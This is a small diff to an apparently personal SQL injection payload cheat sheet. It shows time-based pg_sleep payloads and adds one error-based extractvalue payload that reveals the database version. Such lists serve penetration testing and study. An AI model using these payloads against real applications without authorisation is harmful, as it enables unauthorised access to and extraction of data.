@@ -106,6 +106,7 @@ SQLInjection Basic Stuff
 (select 99999999 from pg_sleep(15))
 9999'||(select 99999999 from pg_sleep(15))||'9999
 9999"||(select 99999999 from pg_sleep(15))||"9999
+extractvalue('<xml>',concat("/",(select version())))
 ```
 Interesting items that can be used to prefix and suffix attacks
 ---------------------
